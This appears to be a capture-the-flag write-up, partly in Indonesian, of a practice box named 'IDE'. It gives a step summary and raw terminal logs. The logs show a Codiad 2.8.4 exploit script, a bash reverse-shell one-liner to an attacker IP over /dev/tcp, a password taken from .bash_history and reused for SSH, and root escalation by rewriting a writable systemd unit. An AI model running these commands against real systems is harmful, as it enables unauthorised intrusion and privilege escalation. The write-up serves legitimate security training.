<img width="512" height="512" alt="image" src="https://github.com/user-attachments/assets/27648ba1-e366-4ca5-9c23-5c26806498db" />
An easy box to polish your enumeration skills!
* Terminal 1 *
<img width="708" height="175" alt="image" src="https://github.com/user-attachments/assets/f0cd40c7-d2b4-4811-9579-e5a000918290" />
* Terminal 2 *
<img width="518" height="99" alt="image" src="https://github.com/user-attachments/assets/abe95f1a-c10c-4006-bc82-ccc3d791afbc" />
*terminal 3 *
<img width="845" height="271" alt="image" src="https://github.com/user-attachments/assets/5acc0111-895b-4aca-8c1e-ee7500a045c8" />


1. Initial Access (Gaining Shell)

Metode: Eksploitasi Codiad 2.8.4 menggunakan Python script (49705.py).
Kredensial: Login berhasil menggunakan username ```john``` dan password ```password```.
Hasil: Mendapatkan reverse shell sebagai user www-data di port 4445.

2. Post-Exploitation (Horizontal Movement)

Stabilisasi Shell: Menggunakan Python pty spawn (python3 -c 'import pty...') untuk mendapatkan shell interaktif.
Temuan Kredensial: Memeriksa file history drac (cat /home/drac/.bash_history) dan menemukan password MySQL: Th3dRaCULa1sR3aL.
Akses SSH: Login sebagai user drac via SSH.
User Flag: Berhasil membaca user.txt di /home/drac/ dengan 
```flag: 02930d21a8eb009f6d26361b2d24a466.```

3. Privilege Escalation (Root Access)

Analisis Sudo: Perintah sudo -l menunjukkan bahwa drac dapat menjalankan /usr/sbin/service vsftpd restart sebagai root tanpa password.
Eksploitasi Service File:
Menemukan bahwa file /lib/systemd/system/vsftpd.service dapat ditulis (writable) oleh grup drac.
Metode Pertama: Mencoba memberikan izin SUID ke bash (chmod +s /bin/bash), namun terhambat karena sistem meminta daemon-reload.
Metode Kedua (Berhasil): Mengubah isi file service untuk menyalin flag root ke direktori publik:
bash
``` ExecStart=/bin/bash -c "cp /root/root.txt /tmp/root_flag.txt && chmod 666 /tmp/root_flag.txt" ```
Gunakan kode dengan hati-hati.

Pemicu (Trigger): Menjalankan sudo /usr/sbin/service vsftpd restart. Meskipun muncul Warning, sistem tetap mengeksekusi payload sebelum berhenti.

4. Final Result

Root Flag: Berhasil membaca flag dari file bocoran di /tmp/root_flag.txt.
```Flag: ce258cb16f47f1c66f0b0b77f4e0fb8d```


//-----------------------------------------

```* Terminal 1 *

┌──(kali㉿DESKTOP-K316IDI)-[~/ywh]
└─$ echo 'bash -c "bash -i >/dev/tcp/192.168.247.59/4445 0>&1 2>&1"' | nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.247.59] from (UNKNOWN) [10.48.177.218] 37598
id

┌──(kali㉿DESKTOP-K316IDI)-[~/ywh]
└─$ id
uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users)
```

//-----------------------------------------

```* Terminal 2 *

┌──(kali㉿DESKTOP-K316IDI)-[~/ywh]
└─$ nc -lvnp 4445
listening on [any] 4445 ...
connect to [192.168.247.59] from (UNKNOWN) [10.48.177.218] 37358
bash: cannot set terminal process group (942): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ide:/var/www/html/codiad/components/filemanager$ whoami
whoami
www-data
www-data@ide:/var/www/html/codiad/components/filemanager$ ssh drac@10.48.177.218
<diad/components/filemanager$ ssh drac@10.48.177.218
Pseudo-terminal will not be allocated because stdin is not a terminal.
Could not create directory '/var/www/.ssh'.
Host key verification failed.
www-data@ide:/var/www/html/codiad/components/filemanager$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<er$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ide:/var/www/html/codiad/components/filemanager$ cat /home/drac/.bash_history
<omponents/filemanager$ cat /home/drac/.bash_history
mysql -u drac -p 'Th3dRaCULa1sR3aL'
www-data@ide:/var/www/html/codiad/components/filemanager$ cat /home/drac/user.txt
<iad/components/filemanager$ cat /home/drac/user.txt
cat: /home/drac/user.txt: Permission denied
www-data@ide:/var/www/html/codiad/components/filemanager$ ssh drac@10.48.157.201
<diad/components/filemanager$ ssh drac@10.48.157.201
ssh: connect to host 10.48.157.201 port 22: No route to host
www-data@ide:/var/www/html/codiad/components/filemanager$ ssh drac@10.48.177.218
<diad/components/filemanager$ ssh drac@10.48.177.218
Could not create directory '/var/www/.ssh'.
The authenticity of host '10.48.177.218 (10.48.177.218)' can't be established.
ECDSA key fingerprint is SHA256:GWJNQaoDgrmm/BUO5jSHIV0V2n4FH4hUK36mnVpXA/Q.
Are you sure you want to continue connecting (yes/no)? yes
yes
Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
drac@10.48.177.218's
password: Th3dRaCULa1sR3aL

Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-147-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Mar 23 20:30:06 UTC 2026

  System load:  0.0               Processes:           113
  Usage of /:   49.9% of 8.79GB   Users logged in:     0
  Memory usage: 38%               IP address for ens5: 10.48.177.218
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

69 packages can be updated.
1 update is a security update.


Last login: Wed Aug  4 06:36:42 2021 from 192.168.0.105
drac@ide:~$ cat /home/drac/user.txt
cat /home/drac/user.txt
02930d21a8eb009f6d26361b2d24a466
drac@ide:~$ (root) NOPASSWD: /usr/sbin/service vsftpd restart
(root) NOPASSWD: /usr/sbin/service vsftpd restart
-bash: syntax error near unexpected token `NOPASSWD:'
drac@ide:~$ sudo /usr/sbin/service ../../bin/bash
sudo /usr/sbin/service ../../bin/bash
[sudo] password for drac: Th3dRaCULa1sR3aL

Sorry, user drac is not allowed to execute '/usr/sbin/service ../../bin/bash' as root on ide.
drac@ide:~$ ls -l /lib/systemd/system/vsftpd.service
ls -l /lib/systemd/system/vsftpd.service
-rw-rw-r-- 1 root drac 248 Aug  4  2021 /lib/systemd/system/vsftpd.service
drac@ide:~$ nano /lib/systemd/system/vsftpd.service
nano /lib/systemd/system/vsftpd.service
Error opening terminal: unknown.
drac@ide:~$ systemctl daemon-reload
sudo /usr/sbin/service vsftpd restart
systemctl daemon-reload
==== AUTHENTICATING FOR org.freedesktop.systemd1.reload-daemon ===
Authentication is required to reload the systemd state.
Authenticating as: drac
Password:
polkit-agent-helper-1: pam_authenticate failed: Authentication failure
==== AUTHENTICATION FAILED ===
Failed to reload daemon: Access denied
drac@ide:~$ sudo -l
sudo -l
[sudo] password for drac: Th3dRaCULa1sR3aL

Matching Defaults entries for drac on ide:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User drac may run the following commands on ide:
    (ALL : ALL) /usr/sbin/service vsftpd restart
drac@ide:~$ echo '[Unit]
Description=get root
[Service]
Type=simple
User=root
ExecStart=/bin/bash -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > /lib/systemd/system/vsftpd.service
echo '[Unit]
> Description=get root
> [Service]
> Type=simple
> User=root
> ExecStart=/bin/bash -c "chmod +s /bin/bash"
> [Install]
> WantedBy=multi-user.target' > /lib/systemd/system/vsftpd.service
drac@ide:~$ sudo -l
sudo -l
Matching Defaults entries for drac on ide:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User drac may run the following commands on ide:
    (ALL : ALL) /usr/sbin/service vsftpd restart
drac@ide:~$ sudo /usr/sbin/service vsftpd restart
sudo /usr/sbin/service vsftpd restart
Warning: The unit file, source configuration file or drop-ins of vsftpd.service changed on disk. Run 'systemctl daemon-reload' to reload units.
drac@ide:~$ bash -p
bash -p
drac@ide:~$ whoami
whoami
drac
drac@ide:~$ cat /root/root.txt
cat /root/root.txt
cat: /root/root.txt: Permission denied
drac@ide:~$ echo '[Service]
Type=simple
User=root
ExecStart=/bin/bash -c "cat /root/root.txt > /tmp/root_flag.txt && chmod 666 /tmp/root_flag.txt"
[Install]
WantedBy=multi-user.target' > /lib/systemd/system/vsftpd.service
echo '[Service]
> Type=simple
> User=root
</tmp/root_flag.txt && chmod 666 /tmp/root_flag.txt"
> [Install]
> WantedBy=multi-user.target' > /lib/systemd/system/vsftpd.service
drac@ide:~$ sudo /usr/sbin/service vsftpd restart
sudo /usr/sbin/service vsftpd restart
Warning: The unit file, source configuration file or drop-ins of vsftpd.service changed on disk. Run 'systemctl daemon-reload' to reload units.
drac@ide:~$ cat /tmp/root_flag.txt
cat /tmp/root_flag.txt
cat: /tmp/root_flag.txt: No such file or directory
drac@ide:~$ ls
ls
user.txt
drac@ide:~$ get user.txt
get user.txt

Command 'get' not found, but there are 18 similar ones.

drac@ide:~$ cat user.txt
cat user.txt
02930d21a8eb009f6d26361b2d24a466
drac@ide:~$ cat /root/root.txt
cat /root/root.txt
cat: /root/root.txt: Permission denied
drac@ide:~$ ls
ls
user.txt
drac@ide:~$ echo -e "[Service]\nExecStart=/bin/bash -c 'chmod +s /bin/bash'\n[Install]\nWantedBy=multi-user.target" > /lib/systemd/system/vsftpd.service
<i-user.target" > /lib/systemd/system/vsftpd.service
drac@ide:~$ sudo /usr/sbin/service vsftpd restart
sudo /usr/sbin/service vsftpd restart
Warning: The unit file, source configuration file or drop-ins of vsftpd.service changed on disk. Run 'systemctl daemon-reload' to reload units.
drac@ide:~$ bash -p
bash -p
drac@ide:~$ ls
ls
user.txt
drac@ide:~$ echo -e "[Service]\nType=simple\nUser=root\nExecStart=/bin/bash -c 'cp /root/root.txt /tmp/root_flag.txt && chmod 666 /tmp/root_flag.txt'\n[Install]\nWantedBy=multi-user.target" > /lib/systemd/system/vsftpd.service
<i-user.target" > /lib/systemd/system/vsftpd.service
echo -e "[Service]\nType=simple\nUser=root\nExecStart=/bin/bash -c 'cp /root/root.txt /tmp/root_flag.txt && chmod 666 /tmp/root_flag.txt'\n[Install]\nWantedBy=multi-user.target" > /lib/systemd/system/vsftpd.service
<i-user.target" > /lib/systemd/system/vsftpd.service
drac@ide:~$ sudo /usr/sbin/service vsftpd restart
sudo /usr/sbin/service vsftpd restart
Warning: The unit file, source configuration file or drop-ins of vsftpd.service changed on disk. Run 'systemctl daemon-reload' to reload units.
drac@ide:~$ cat /tmp/root_flag.txt
cat /tmp/root_flag.txt
cat: /tmp/root_flag.txt: No such file or directory
drac@ide:~$ ls
ls
user.txt
drac@ide:~$ echo 'cp /root/root.txt /tmp/flag.txt && chmod 666 /tmp/flag.txt' > /tmp/getroot.sh
chmod +x /tmp/getroot.sh
<g.txt && chmod 666 /tmp/flag.txt' > /tmp/getroot.sh
drac@ide:~$ chmod +x /tmp/getroot.sh
drac@ide:~$ ln -sf /tmp/getroot.sh /usr/sbin/vsftpd
ln -sf /tmp/getroot.sh /usr/sbin/vsftpd
ln: failed to create symbolic link '/usr/sbin/vsftpd': Permission denied
drac@ide:~$ sudo /usr/sbin/service vsftpd restart
sudo /usr/sbin/service vsftpd restart
Warning: The unit file, source configuration file or drop-ins of vsftpd.service changed on disk. Run 'systemctl daemon-reload' to reload units.
drac@ide:~$ sudo l
sudo l
sudo: l: command not found
drac@ide:~$ sudo -l
sudo -l
Matching Defaults entries for drac on ide:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User drac may run the following commands on ide:
    (ALL : ALL) /usr/sbin/service vsftpd restart
drac@ide:~$ ls -la /lib/systemd/system/vsftpd.service
ls -la /lib/systemd/system/vsftpd.service
-rw-rw-r-- 1 root drac 163 Mar 23 20:38 /lib/systemd/system/vsftpd.service
drac@ide:~$ ls -la
ls -la
total 52
drwxr-xr-x 6 drac drac 4096 Aug  4  2021 .
drwxr-xr-x 3 root root 4096 Jun 17  2021 ..
-rw-r--r-- 1 drac drac   36 Jul 11  2021 .bash_history
-rw-r--r-- 1 drac drac  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 drac drac 3787 Jul 11  2021 .bashrc
drwx------ 4 drac drac 4096 Jun 18  2021 .cache
drwxr-x--- 3 drac drac 4096 Jun 18  2021 .config
drwx------ 4 drac drac 4096 Jun 18  2021 .gnupg
drwx------ 3 drac drac 4096 Jun 18  2021 .local
-rw-r--r-- 1 drac drac  807 Apr  4  2018 .profile
-rw-r--r-- 1 drac drac    0 Jun 17  2021 .sudo_as_admin_successful
-r-------- 1 drac drac   33 Jun 18  2021 user.txt
-rw------- 1 drac drac   49 Jun 18  2021 .Xauthority
-rw------- 1 drac drac  557 Jun 18  2021 .xsession-errors
drac@ide:~$ ls
ls
user.txt
drac@ide:~$ sudo /usr/sbin/service vsftpd restart
sudo /usr/sbin/service vsftpd restart
Warning: The unit file, source configuration file or drop-ins of vsftpd.service changed on disk. Run 'systemctl daemon-reload' to reload units.
drac@ide:~$ systemctl daemon-reload
systemctl daemon-reload
==== AUTHENTICATING FOR org.freedesktop.systemd1.reload-daemon ===
Authentication is required to reload the systemd state.
Authenticating as: drac
Password: Failed to reload daemon: Method call timed out
polkit-agent-helper-1: pam_authenticate failed: Authentication failure
drac@ide:~$ Th3dRaCULa1sR3aL
Th3dRaCULa1sR3aL: command not found
drac@ide:~$ systemctl daemon-reload
==== AUTHENTICATING FOR org.freedesktop.systemd1.reload-daemon ===
Authentication is required to reload the systemd state.
Authenticating as: drac
Password: Th3dRaCULa1sR3aL

==== AUTHENTICATION COMPLETE ===
drac@ide:~$ sudo /usr/sbin/service vsftpd restart
drac@ide:~$ id
uid=1000(drac) gid=1000(drac) groups=1000(drac),24(cdrom),27(sudo),30(dip),46(plugdev)
drac@ide:~$ cd /root
bash: cd: /root: Permission denied
drac@ide:~$ sudo /usr/sbin/service ../../bin/bash
Sorry, user drac is not allowed to execute '/usr/sbin/service ../../bin/bash' as root on ide.
drac@ide:~$ bash -p
drac@ide:~$ cat /tmp/hacked.txt
cat: /tmp/hacked.txt: No such file or directory
drac@ide:~$ ls
user.txt
drac@ide:~$ sudo /usr/sbin/service vsftpd restart
drac@ide:~$ bash -p
drac@ide:~$ cat /tmp/root_flag.txt
ce258cb16f47f1c66f0b0b77f4e0fb8d
drac@ide:~$
```
//-----------------------------------------

```* Terminal 3 *

┌──(kali㉿DESKTOP-K316IDI)-[~/ywh]
└─$ python3 49705.py http://10.48.177.218:62337/ john password 192.168.247.59 4444 linux
[+] Please execute the following command on your vps:
echo 'bash -c "bash -i >/dev/tcp/192.168.247.59/4445 0>&1 2>&1"' | nc -lnvp 4444
nc -lnvp 4445
[+] Please confirm that you have done the two command above [y/n]
[Y/n] Y
[+] Starting...
[+] Login Content : {"status":"success","data":{"username":"john"}}
[+] Login success!
[+] Getting writeable path...
[+] Path Content : {"status":"success","data":{"name":"CloudCall","path":"\/var\/www\/html\/codiad_projects"}}
[+] Writeable Path : /var/www/html/codiad_projects
[+] Sending payload...

```

//-----------------------------------------

user.txt: ```02930d21a8eb009f6d26361b2d24a466```
root_flag.txt: ```ce258cb16f47f1c66f0b0b77f4e0fb8d```
